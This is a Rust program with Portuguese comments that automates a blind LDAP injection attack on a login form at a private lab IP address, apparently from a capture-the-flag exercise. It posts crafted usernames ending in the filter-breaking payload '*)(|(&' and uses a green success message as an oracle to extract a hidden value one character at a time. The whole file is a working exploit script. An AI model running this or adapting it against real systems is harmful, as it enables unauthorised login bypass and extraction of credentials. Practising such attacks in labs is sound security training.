use reqwest::{Client, header};
use scraper::{Html, Selector};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // URL base para a requisição
    let url = "http://10.10.171.201/blind.php";

    // Conjunto de caracteres para testar (equivalente ao char_set do Python)
    let char_set: Vec<char> = {
        let mut chars = Vec::new();
        
        // Adiciona letras minúsculas em ordem
        for c in 'a'..='z' {
            chars.push(c);
        }
        
        // Adiciona letras maiúsculas em ordem
        for c in 'A'..='Z' {
            chars.push(c);
        }
        
        // Adiciona números e caracteres especiais
        chars.extend(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
                      '.', '_', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')']);
        
        chars
    };

    // Cliente HTTP para fazer requisições
    let client = Client::new();

    // Variáveis para armazenar a extração
    let mut successful_chars = String::new();
    let mut successful_response_found = true;

    while successful_response_found {
        successful_response_found = false;

        for character in &char_set {
            // Prepara os dados para enviar na requisição
            let username = format!("{}{character}*)(|(&", successful_chars);
            let password = String::from("pwd)");

            let data = [
                ("username", &username),
                ("password", &password)
            ];

            // Cabeçalhos da requisição
            let mut headers = header::HeaderMap::new();
            headers.insert(
                header::CONTENT_TYPE, 
                header::HeaderValue::from_static("application/x-www-form-urlencoded")
            );

            // Envia a requisição POST
            let response = client
                .post(url)
                .headers(headers)
                .form(&data)
                .send()
                .await?;

            // Obtém o conteúdo HTML da resposta
            let body = response.text().await?;
            let document = Html::parse_document(&body);

            // Selector para encontrar parágrafos verdes (critério de sucesso)
            let selector = Selector::parse("p[style='color: green;']").unwrap();

            // Verifica se encontrou elementos que indicam sucesso
            if !document.select(&selector).next().is_none() {
                successful_response_found = true;
                successful_chars.push(*character);
                println!("Caractere encontrado com sucesso: {}", character);
                break;
            }
        }

        // Se nenhum caractere for encontrado, encerra o loop
        if !successful_response_found {
            println!("Nenhum caractere encontrado nesta iteração.");
            break;
        }
    }

    // Imprime o resultado final
    println!("Carga útil final bem-sucedida: {}", successful_chars);

    Ok(())
}
